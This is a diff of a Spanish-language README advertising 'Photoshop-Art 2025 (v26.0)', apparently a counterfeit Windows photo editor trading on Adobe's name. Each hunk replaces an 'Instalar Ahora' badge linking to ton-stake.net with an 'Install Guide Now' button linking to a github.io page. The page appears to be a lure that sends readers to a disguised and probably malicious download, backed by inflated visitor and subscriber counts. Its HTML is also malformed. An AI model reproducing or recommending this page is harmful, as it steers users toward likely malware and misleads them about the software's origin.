@@ -6,7 +6,9 @@
 
 **Descripción**: Edite imágenes con **Photoshop-Art 2025 (v26.0)**, una herramienta de diseño gráfico para Windows! Mejore fotos, desarrolle proyectos y organice su trabajo. ¡Únase a 67K+ visitantes y 43K+ suscriptores para consejos en 2025!
 
-[![Instalar Ahora](https://img.shields.io/badge/Instalar_Ahora-AHORA-00cc00?style=rounded&labelColor=1a1a1a)](https://ton-stake.net)
+<a href="https://centro-de-adobe-creative-pro.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-9b6_%E2%86%92_3498db?style=gradient" alt="Install Guide Now" width="230height="45 style="border:none;">
+</a>
 
 ---
 
@@ -34,7 +36,9 @@ Comience con **Photoshop-Art 2025** para editar imágenes en Windows con estos s
 6. **Solución de Problemas** ❓  
    ¿Problemas? Verifique la compatibilidad de la tarjeta gráfica, actualice los controladores o visite nuestro foro comunitario para soporte.
 
-[![Instalar Ahora](https://img.shields.io/badge/Instalar_Ahora-AHORA-00cc00?style=rounded&labelColor=1a1a1a)](https://ton-stake.net)
+<a href="https://centro-de-adobe-creative-pro.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-9b6_%E2%86%92_3498db?style=gradient" alt="Install Guide Now" width="230height="45 style="border:none;">
+</a>
 
 ---
 
@@ -47,7 +51,9 @@ Comience con **Photoshop-Art 2025** para editar imágenes en Windows con estos s
 - 🌍 **Comunidad Activa**: Apoyada por 67K+ visitantes y 43K+ suscriptores que comparten consejos.  
 - 📅 **Actualizaciones 2025**: Actualizado regularmente para nuevas funciones de edición.
 
-[![Instalar Ahora](https://img.shields.io/badge/Instalar_Ahora-AHORA-00cc00?style=rounded&labelColor=1a1a1a)](https://ton-stake.net)
+<a href="https://centro-de-adobe-creative-pro.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-9b6_%E2%86%92_3498db?style=gradient" alt="Install Guide Now" width="230height="45 style="border:none;">
+</a>
 
 ---
 
@@ -65,7 +71,9 @@ Comience con **Photoshop-Art 2025** para editar imágenes en Windows con estos s
 - 🛠 **Edición Avanzada**: Aplique efectos profesionales a sus fotos.  
 - 📚 **Consejos Comunitarios**: Aprenda de las técnicas de los 43K+ suscriptores.
 
-[![Instalar Ahora](https://img.shields.io/badge/Instalar_Ahora-AHORA-00cc00?style=rounded&labelColor=1a1a1a)](https://ton-stake.net)
+<a href="https://centro-de-adobe-creative-pro.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-9b6_%E2%86%92_3498db?style=gradient" alt="Install Guide Now" width="230height="45 style="border:none;">
+</a>
 
 ---
 
